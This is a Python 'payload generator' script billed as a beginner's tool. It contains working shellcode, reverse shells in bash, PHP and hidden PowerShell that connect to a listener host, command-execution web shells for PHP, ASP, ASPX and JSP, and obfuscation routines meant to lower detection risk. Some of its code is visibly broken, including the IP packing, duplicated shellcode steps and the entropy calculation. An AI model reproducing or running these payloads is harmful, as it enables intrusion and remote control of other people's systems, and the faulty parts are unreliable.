#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload Generator in Python for Cybersecurity
This script generates various types of payloads for different exploitation scenarios:
- Shellcode for different platforms (Windows, Linux, macOS)
- Reverse TCP shells
- Bind TCP shells
- HTTP(S) shells
- Fileless payloads
- Encrypted payloads
Perfect for beginners!
"""

import struct
import base64
import binascii
import zlib
import random
import string
import json
from datetime import datetime

class PayloadGenerator:
    """Class for generating various types of payloads"""
    
    def __init__(self):
        """Initialize payload generator"""
        self.payloads = {}
        self.default_options = {
            'lhost': '192.168.1.100',
            'lport': 4444,
            'encoding': 'base64',
            'compression': 'none',
            'encryption': 'none'
        }
        
    # ==========================================
    # Shellcode Generators
    # ==========================================
    def generate_shellcode(self, platform, arch, payload_type, options=None):
        """
        Generate shellcode based on platform and architecture
        
        Args:
            platform: Target platform (linux, windows, mac)
            arch: Architecture (x86, x64)
            payload_type: Type of shellcode (reverse_tcp, bind_tcp, execve)
            options: Additional options
            
        Returns:
            Shellcode as bytes
        """
        if not options:
            options = self.default_options
            
        if platform == 'linux' and arch == 'x86':
            return self._generate_linux_x86_shellcode(payload_type, options)
        elif platform == 'linux' and arch == 'x64':
            return self._generate_linux_x64_shellcode(payload_type, options)
        elif platform == 'windows' and arch == 'x86':
            return self._generate_windows_x86_shellcode(payload_type, options)
        elif platform == 'windows' and arch == 'x64':
            return self._generate_windows_x64_shellcode(payload_type, options)
        else:
            raise ValueError(f"Unsupported platform/arch combination: {platform}/{arch}")
            
    def _generate_linux_x86_shellcode(self, payload_type, options):
        """Generate Linux x86 shellcode"""
        if payload_type == 'execve':
            # execve("/bin/sh", NULL, NULL)
            return b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
            
        elif payload_type == 'reverse_tcp':
            # Reverse TCP shell (192.168.1.100:4444)
            ip = struct.pack('<I', int(options['lhost'].replace('.', ''), 10))
            port = struct.pack('<H', options['lport'])
            
            shellcode = b"\x31\xc0"              # xor eax,eax
            shellcode += b"\x31\xdb"            # xor ebx,ebx
            shellcode += b"\x31\xc9"            # xor ecx,ecx
            shellcode += b"\x31\xd2"            # xor edx,edx
            shellcode += b"\xb0\x66"            # mov al,0x66
            shellcode += b"\xb3\x01"            # mov bl,0x1
            shellcode += b"\x51"                # push ecx
            shellcode += b"\x6a\x06"            # push byte +0x6
            shellcode += b"\x6a\x01"            # push byte +0x1
            shellcode += b"\x6a\x02"            # push byte +0x2
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\xcd\x80"            # int 0x80
            shellcode += b"\x96"                # xchg eax,esi
            shellcode += b"\x31\xd2"            # xor edx,edx
            shellcode += b"\xb0\x66"            # mov al,0x66
            shellcode += b"\xb3\x03"            # mov bl,0x3
            shellcode += b"\x52"                # push edx
            shellcode += b"\x66\x68" + port    # push word 0x115c (4444)
            shellcode += b"\x66\x53"            # push bx
            shellcode += b"\x66\x68" + port    # push word 0x115c (4444)
            shellcode += b"\x66\x53"            # push bx
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\x6a\x10"            # push byte +0x10
            shellcode += b"\x51"                # push ecx
            shellcode += b"\x56"                # push esi
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\xcd\x80"            # int 0x80
            shellcode += b"\xb0\x66"            # mov al,0x66
            shellcode += b"\xb3\x02"            # mov bl,0x2
            shellcode += b"\x68" + ip          # push dword 0x6401a8c0 (192.168.1.100)
            shellcode += b"\x66\x68" + port    # push word 0x115c (4444)
            shellcode += b"\x43"                # inc ebx
            shellcode += b"\x66\x53"            # push bx
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\x6a\x10"            # push byte +0x10
            shellcode += b"\x51"                # push ecx
            shellcode += b"\x56"                # push esi
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\xcd\x80"            # int 0x80
            shellcode += b"\x31\xc9"            # xor ecx,ecx
            shellcode += b"\xb1\x03"            # mov cl,0x3
            shellcode += b"\x31\xc0"            # xor eax,eax
            shellcode += b"\xb0\x3f"            # mov al,0x3f
            shellcode += b"\xcd\x80"            # int 0x80
            shellcode += b"\x49"                # dec ecx
            shellcode += b"\x79\xf9"            # jns 0x24
            shellcode += b"\x31\xc0"            # xor eax,eax
            shellcode += b"\x50"                # push eax
            shellcode += b"\x68\x2f\x2f\x73\x68" # push dword 0x68732f2f
            shellcode += b"\x68\x2f\x62\x69\x6e" # push dword 0x6e69622f
            shellcode += b"\x89\xe3"            # mov ebx,esp
            shellcode += b"\x50"                # push eax
            shellcode += b"\x53"                # push ebx
            shellcode += b"\x89\xe1"            # mov ecx,esp
            shellcode += b"\xb0\x0b"            # mov al,0xb
            shellcode += b"\xcd\x80"            # int 0x80
            
            return shellcode
            
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")
            
    def _generate_linux_x64_shellcode(self, payload_type, options):
        """Generate Linux x64 shellcode"""
        if payload_type == 'execve':
            # execve("/bin/sh", NULL, NULL) for x64
            return b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
            
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")
            
    def _generate_windows_x86_shellcode(self, payload_type, options):
        """Generate Windows x86 shellcode"""
        if payload_type == 'message_box':
            # Windows API call to MessageBox
            return b"\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d\x78\x01\xeb\x8b\x4b\x18\x8b\x7b\x20\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x59\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x59\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x5f\xff\xff\xff\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x56\x88\x7c\x24\x0b\x89\xe1\x31\xd2\x52\x53\x56\xff\x55\x08"
            
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")
            
    # ==========================================
    # Encoding and Encryption
    # ==========================================
    def encode_payload(self, payload, encoding='base64', compression='none'):
        """
        Encode and compress payload
        
        Args:
            payload: Raw payload
            encoding: Encoding method (base64, hex, url, b64url)
            compression: Compression method (none, zlib)
            
        Returns:
            Encoded payload string
        """
        processed = payload
        
        # Apply compression
        if compression == 'zlib':
            processed = zlib.compress(processed)
            
        # Apply encoding
        if encoding == 'base64':
            return base64.b64encode(processed).decode('utf-8')
        elif encoding == 'hex':
            return binascii.hexlify(processed).decode('utf-8')
        elif encoding == 'url':
            return base64.urlsafe_b64encode(processed).decode('utf-8')
        elif encoding == 'b64url':
            return base64.urlsafe_b64encode(processed).decode('utf-8').rstrip('=')
        else:
            raise ValueError(f"Unsupported encoding: {encoding}")
            
    def decode_payload(self, encoded_payload, encoding='base64', compression='none'):
        """
        Decode and decompress payload
        
        Args:
            encoded_payload: Encoded payload string
            encoding: Encoding method
            compression: Compression method
            
        Returns:
            Decoded payload bytes
        """
        processed = None
        
        # Decode
        if encoding == 'base64':
            processed = base64.b64decode(encoded_payload)
        elif encoding == 'hex':
            processed = binascii.unhexlify(encoded_payload)
        elif encoding == 'url' or encoding == 'b64url':
            # Handle URL-safe base64
            padding = 4 - len(encoded_payload) % 4
            if padding != 4:
                encoded_payload += '=' * padding
            processed = base64.urlsafe_b64decode(encoded_payload)
        else:
            raise ValueError(f"Unsupported encoding: {encoding}")
            
        # Decompress
        if compression == 'zlib':
            processed = zlib.decompress(processed)
            
        return processed
        
    # ==========================================
    # Web Payloads
    # ==========================================
    def generate_web_payload(self, language, payload_type, options=None):
        """
        Generate web application payload
        
        Args:
            language: Programming language (php, asp, aspx, jsp)
            payload_type: Type of payload (reverse_shell, cmd_exec)
            options: Additional options
            
        Returns:
            Web payload string
        """
        if not options:
            options = self.default_options
            
        if language == 'php':
            return self._generate_php_payload(payload_type, options)
        elif language == 'asp':
            return self._generate_asp_payload(payload_type, options)
        elif language == 'aspx':
            return self._generate_aspx_payload(payload_type, options)
        elif language == 'jsp':
            return self._generate_jsp_payload(payload_type, options)
        else:
            raise ValueError(f"Unsupported language: {language}")
            
    def _generate_php_payload(self, payload_type, options):
        """Generate PHP payload"""
        if payload_type == 'reverse_shell':
            return f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{options['lhost']}/{options['lport']} 0>&1'"); ?>"""
        elif payload_type == 'cmd_exec':
            return '<?php system($_GET["cmd"]); ?>'
        else:
            raise ValueError(f"Unsupported PHP payload type: {payload_type}")
            
    def _generate_asp_payload(self, payload_type, options):
        """Generate ASP payload"""
        if payload_type == 'cmd_exec':
            return '<% eval request("cmd") %>'
        else:
            raise ValueError(f"Unsupported ASP payload type: {payload_type}")
            
    def _generate_aspx_payload(self, payload_type, options):
        """Generate ASPX payload"""
        if payload_type == 'cmd_exec':
            return '<%@ Page Language="C#"%><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd()); %>'
        else:
            raise ValueError(f"Unsupported ASPX payload type: {payload_type}")
            
    def _generate_jsp_payload(self, payload_type, options):
        """Generate JSP payload"""
        if payload_type == 'cmd_exec':
            return """<%@ page import="java.io.*" %><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while((line = in.readLine()) != null) { out.println(line); } %>"""
        else:
            raise ValueError(f"Unsupported JSP payload type: {payload_type}")
            
    # ==========================================
    # Fileless Payloads
    # ==========================================
    def generate_fileless_payload(self, os, payload_type, options=None):
        """
        Generate fileless payload
        
        Args:
            os: Target operating system (windows, linux)
            payload_type: Type of payload (powershell, bash)
            options: Additional options
            
        Returns:
            Fileless payload string
        """
        if not options:
            options = self.default_options
            
        if os == 'windows' and payload_type == 'powershell':
            return self._generate_powershell_payload(options)
        elif os == 'linux' and payload_type == 'bash':
            return self._generate_bash_payload(options)
        else:
            raise ValueError(f"Unsupported fileless payload type: {os}/{payload_type}")
            
    def _generate_powershell_payload(self, options):
        """Generate PowerShell payload"""
        return f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command $i="{options['lhost']}";$p={options['lport']};$c=New-Object System.Net.Sockets.TCPClient($i,$p);$s=$c.GetStream();$n=0;$b=New-Object byte[] 4096;$sb=New-Object System.Text.StringBuilder;while(($n = $s.Read($b,0,$b.Length)) -ne 0){{$d=[text.encoding]::ASCII.GetString($b,0,$n);$sb.Append($d);if($d.EndsWith('`n')){{$o=(Invoke-Expression $sb.ToString() 2>&1 | Out-String);$s.Write([text.encoding]::ASCII.GetBytes($o),0,$o.Length);$sb.Clear()}}}}"""
            
    def _generate_bash_payload(self, options):
        """Generate Bash payload"""
        return f"bash -i >& /dev/tcp/{options['lhost']}/{options['lport']} 0>&1"
            
    # ==========================================
    # Obfuscation Techniques
    # ==========================================
    def obfuscate_payload(self, payload, technique='base64', iterations=1):
        """
        Obfuscate payload using various techniques
        
        Args:
            payload: Raw payload string
            technique: Obfuscation technique (base64, rot13, hex, unicode)
            iterations: Number of obfuscation iterations
            
        Returns:
            Obfuscated payload
        """
        obfuscated = payload
        
        for i in range(iterations):
            if technique == 'base64':
                obfuscated = base64.b64encode(obfuscated.encode('utf-8')).decode('utf-8')
            elif technique == 'rot13':
                obfuscated = self._rot13(obfuscated)
            elif technique == 'hex':
                obfuscated = binascii.hexlify(obfuscated.encode('utf-8')).decode('utf-8')
            elif technique == 'unicode':
                obfuscated = ''.join(f"\\u{ord(c):04x}" for c in obfuscated)
            else:
                raise ValueError(f"Unsupported obfuscation technique: {technique}")
                
        return obfuscated
        
    def _rot13(self, text):
        """Apply ROT13 obfuscation"""
        result = []
        for char in text:
            if 'a' <= char <= 'm' or 'A' <= char <= 'M':
                result.append(chr(ord(char) + 13))
            elif 'n' <= char <= 'z' or 'N' <= char <= 'Z':
                result.append(chr(ord(char) - 13))
            else:
                result.append(char)
        return ''.join(result)
        
    # ==========================================
    # Payload Storage and Management
    # ==========================================
    def save_payload(self, payload, filename, metadata=None):
        """
        Save payload to file with metadata
        
        Args:
            payload: Payload data
            filename: Output filename
            metadata: Additional metadata to include
            
        Returns:
            Full file path
        """
        if not metadata:
            metadata = {}
            
        entry = {
            'payload': payload,
            'metadata': metadata,
            'timestamp': datetime.now().isoformat(),
            'length': len(payload)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(entry, f, indent=2, default=str)
            
        return filename
        
    def load_payload(self, filename):
        """
        Load payload from file
        
        Args:
            filename: Input filename
            
        Returns:
            Dictionary with payload and metadata
        """
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
            
    def list_payloads(self, directory='.'):
        """
        List all saved payloads
        
        Args:
            directory: Directory to search
            
        Returns:
            List of payload metadata
        """
        import os
        import glob
        
        payloads = []
        
        for file in glob.glob(os.path.join(directory, '*.payload')):
            try:
                entry = self.load_payload(file)
                entry['filename'] = file
                payloads.append(entry)
            except Exception as e:
                print(f"Error loading {file}: {e}")
                
        return payloads
        
    # ==========================================
    # Payload Analysis and Verification
    # ==========================================
    def analyze_payload(self, payload):
        """
        Analyze payload for detection patterns
        
        Args:
            payload: Payload to analyze
            
        Returns:
            Analysis results
        """
        analysis = {
            'length': len(payload),
            'null_bytes': payload.count(b'\x00'),
            'printable_chars': sum(1 for c in payload if 0x20 <= c <= 0x7e),
            'entropy': self._calculate_entropy(payload),
            'patterns': self._find_patterns(payload),
            'detection_risk': 'unknown'
        }
        
        # Calculate detection risk
        if analysis['null_bytes'] > len(payload) * 0.1:
            analysis['detection_risk'] = 'high'
        elif analysis['printable_chars'] < len(payload) * 0.5:
            analysis['detection_risk'] = 'medium'
        else:
            analysis['detection_risk'] = 'low'
            
        return analysis
        
    def _calculate_entropy(self, data):
        """Calculate entropy of data"""
        if not data:
            return 0.0
            
        from collections import Counter
        
        counter = Counter(data)
        length = len(data)
        entropy = 0.0
        
        for count in counter.values():
            probability = count / length
            entropy -= probability * (probability.bit_length() if probability else 0)
            
        return entropy
        
    def _find_patterns(self, payload):
        """Find common patterns in payload"""
        patterns = []
        
        # Check for null bytes
        if b'\x00' in payload:
            patterns.append('null_bytes')
            
        # Check for common strings
        check_strings = [
            b'exec', b'system', b'eval', b'command', b'shell',
            b'tcp', b'udp', b'connect', b'reverse', b'bind',
            b'powershell', b'bash', b'cmd', b'python'
        ]
        
        for check in check_strings:
            if check in payload:
                patterns.append(check.decode('utf-8'))
                
        return patterns

def demo_payload_generator():
    """Demonstrate payload generator functionality"""
    print(f"{'='*60}")
    print(f"  PAYLOAD GENERATOR DEMONSTRATION")
    print(f"{'='*60}")
    
    generator = PayloadGenerator()
    
    # Test 1: Generate Linux x86 shellcode
    print(f"\n1. Generating Linux x86 Reverse TCP Shellcode:")
    try:
        shellcode = generator.generate_shellcode('linux', 'x86', 'reverse_tcp')
        print(f"   Success: {len(shellcode)} bytes")
        print(f"   Hex: {binascii.hexlify(shellcode).decode('utf-8')}")
    except Exception as e:
        print(f"   Error: {e}")
        
    # Test 2: Generate PHP payload
    print(f"\n2. Generating PHP Reverse Shell:")
    try:
        php_payload = generator.generate_web_payload('php', 'reverse_shell')
        print(f"   Success: {len(php_payload)} bytes")
        print(f"   Preview: {php_payload[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")
        
    # Test 3: Generate PowerShell payload
    print(f"\n3. Generating PowerShell Payload:")
    try:
        ps_payload = generator.generate_fileless_payload('windows', 'powershell')
        print(f"   Success: {len(ps_payload)} bytes")
        print(f"   Preview: {ps_payload[:100]}...")
    except Exception as e:
        print(f"   Error: {e}")
        
    # Test 4: Encode payload
    print(f"\n4. Testing Payload Encoding:")
    try:
        raw_payload = b"Test payload for encoding"
        encoded = generator.encode_payload(raw_payload, 'base64', 'zlib')
        print(f"   Base64 encoded: {encoded}")
        decoded = generator.decode_payload(encoded, 'base64', 'zlib')
        print(f"   Decoded matches original: {decoded == raw_payload}")
    except Exception as e:
        print(f"   Error: {e}")
        
    # Test 5: Obfuscation
    print(f"\n5. Testing Obfuscation:")
    try:
        original = "<?php system('id'); ?>"
        obfuscated = generator.obfuscate_payload(original, 'base64', 3)
        print(f"   Original: {original}")
        print(f"   Obfuscated: {obfuscated}")
    except Exception as e:
        print(f"   Error: {e}")
        
    # Test 6: Analysis
    print(f"\n6. Testing Payload Analysis:")
    try:
        test_payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        analysis = generator.analyze_payload(test_payload)
        print(f"   Length: {analysis['length']} bytes")
        print(f"   Null bytes: {analysis['null_bytes']}")
        print(f"   Printable chars: {analysis['printable_chars']}")
        print(f"   Entropy: {analysis['entropy']:.4f}")
        print(f"   Detection risk: {analysis['detection_risk']}")
    except Exception as e:
        print(f"   Error: {e}")
        
    return True

def main():
    """Main function to demonstrate payload generator"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Payload Generator - Create and manage exploitation payloads"
    )
    
    parser.add_argument(
        "-d", "--demo",
        action="store_true",
        help="Run payload generator demonstration"
    )
    
    parser.add_argument(
        "-g", "--generate",
        action="store_true",
        help="Generate payload"
    )
    
    parser.add_argument(
        "-p", "--platform",
        choices=['linux', 'windows', 'mac'],
        default='linux',
        help="Target platform"
    )
    
    parser.add_argument(
        "-a", "--arch",
        choices=['x86', 'x64'],
        default='x86',
        help="Target architecture"
    )
    
    parser.add_argument(
        "-t", "--type",
        choices=['reverse_tcp', 'bind_tcp', 'execve', 'cmd_exec'],
        default='reverse_tcp',
        help="Payload type"
    )
    
    parser.add_argument(
        "-l", "--lhost",
        default='192.168.1.100',
        help="Listener host (default: 192.168.1.100)"
    )
    
    parser.add_argument(
        "-P", "--lport",
        type=int,
        default=4444,
        help="Listener port (default: 4444)"
    )
    
    parser.add_argument(
        "-o", "--output",
        help="Output file for generated payload"
    )
    
    parser.add_argument(
        "-e", "--encode",
        action="store_true",
        help="Encode payload"
    )
    
    parser.add_argument(
        "-E", "--encoding",
        choices=['base64', 'hex', 'url', 'b64url'],
        default='base64',
        help="Encoding method (default: base64)"
    )
    
    args = parser.parse_args()
    
    try:
        if args.demo:
            demo_payload_generator()
        elif args.generate:
            generator = PayloadGenerator()
            
            options = {
                'lhost': args.lhost,
                'lport': args.lport
            }
            
            payload = None
            
            if args.platform in ['linux', 'windows', 'mac']:
                payload = generator.generate_shellcode(args.platform, args.arch, args.type, options)
            elif args.platform == 'web':
                payload = generator.generate_web_payload(args.arch, args.type, options)
            elif args.platform == 'fileless':
                payload = generator.generate_fileless_payload(args.arch, args.type, options)
                
            if payload:
                if args.encode:
                    encoded = generator.encode_payload(payload, args.encoding)
                    print(f"Encoded payload ({args.encoding}):")
                    print(encoded)
                    
                    if args.output:
                        with open(args.output, 'w', encoding='utf-8') as f:
                            f.write(encoded)
                        print(f"Encoded payload saved to: {args.output}")
                else:
                    print(f"Raw payload ({len(payload)} bytes):")
                    print(binascii.hexlify(payload).decode('utf-8'))
                    
                    if args.output:
                        with open(args.output, 'wb') as f:
                            f.write(payload)
                        print(f"Raw payload saved to: {args.output}")
                        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        print(traceback.format_exc())

if __name__ == "__main__":
    main()
